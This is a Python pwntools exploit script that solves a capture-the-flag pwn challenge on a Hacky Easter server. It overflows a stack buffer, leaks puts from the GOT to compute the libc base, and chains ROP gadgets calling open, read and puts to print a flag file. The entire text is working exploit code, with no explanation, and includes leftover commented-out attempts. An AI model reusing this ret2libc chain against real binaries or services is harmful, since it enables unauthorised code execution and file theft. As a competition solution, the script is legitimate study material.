from pwn import *

#local = 1
local = 0

if local ==1:
	s = process("./main")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	pop_rdx_gadget_offset = 0x00000000000fdc9d
	pop_rsi_gadget_offset = 0x0000000000028ed9
	mv_rsi_rdi_offset = 0x122c2d

else:
	s = remote(host="ch.hackyeaster.com",port=2314)
	libc = ELF("libc-2.27.so")
	pop_rdx_gadget_offset = 0x0000000000001b96
	pop_rsi_gadget_offset = 0x0000000000023a6a
	mv_rsi_rdi_offset = 0x14007d

s.recvuntil(b"Show me what you can do:")

input()

pop_rdi_gadget = 0x0000000000400803
#pop_rsi_gadget = 0x0000000000400801
ret_gadget = 0x0000000000400536
test_string = 0x400948
main_string = 0x6003f3
blah_string = 0x6010e5
puts_plt = 0x400550
puts_got = 0x601018
printf_got = 0x601028
vuln_func_addr = 0x400715
main_func_addr = 0x40074e
pop_rbp_gadget = 0x0000000000400608

s.send(b"A" * 40 + p64(pop_rdi_gadget) + p64(puts_got) + p64(puts_plt) + p64(ret_gadget) + p64(main_func_addr) + b"\n")

puts_leak = s.recvuntil(b"Show me what you can do:")
puts_leak = int.from_bytes(puts_leak.split(b"\n")[0][1:],"little")

print("puts leak: " + hex(puts_leak))

#s.send(b"A" * 40 + p64(pop_rdi_gadget) + p64(printf_got) + p64(puts_plt) + p64(ret_gadget) + p64(main_func_addr) + b"\n")

#printf_leak = s.recvuntil(b"Show me what you can do:")
#printf_leak = int.from_bytes(printf_leak.split(b"\n")[0][1:],"little")

#print("printf leak: " + hex(printf_leak))

libc.address = puts_leak - libc.symbols["puts"]
print("calculates libc base: " + hex(libc.address))

pop_rdx_gadget = libc.address + pop_rdx_gadget_offset
pop_rsi_gadget = libc.address + pop_rsi_gadget_offset
mv_rsi_rdi_gadget = libc.address + mv_rsi_rdi_offset


print("libc open: " + hex(libc.sym["open"]))

#s.send(b"A" * 40 + p64(pop_rdi_gadget) + p64(main_string) + p64(libc.sym["puts"]) + p64(ret_gadget) + p64(main_func_addr) + b"\n")
# this open works!
#payload = b"A" * 40 + p64(pop_rdi_gadget) + p64(next(libc.search(b"/bin/sh")) + 5) + p64(pop_rsi_gadget) + p64(0x0) + p64(libc.sym["open"]) + p64(ret_gadget) + p64(main_func_addr) b"\n")

### open the file!
payload = b"A" * 40 + p64(pop_rdi_gadget) + p64(0x0047414c462F) + p64(pop_rsi_gadget) + p64(blah_string) + p64(mv_rsi_rdi_gadget) + p64(pop_rdi_gadget) + p64(blah_string) + p64(pop_rsi_gadget) + p64(0x0) + p64(libc.sym["open"]) + p64(main_func_addr)
s.send(payload + b"\n")
s.recvuntil(b"Show me what you can do:")


### read from the open file!!
payload = b"A" * 40 + p64(pop_rdi_gadget) + p64(0x3) + p64(pop_rsi_gadget) + p64(blah_string) + p64(pop_rdx_gadget) + p64(0xfff) + p64(libc.sym["read"]) + p64(ret_gadget) + p64(main_func_addr)

s.send(payload + b"\n")
s.recvuntil(b"Show me what you can do:")

### print the flag!!
s.send(b"A" * 40 + p64(pop_rdi_gadget) + p64(blah_string) + p64(puts_plt) + p64(ret_gadget) + p64(main_func_addr))
s.send(payload + b"\n")

s.interactive()
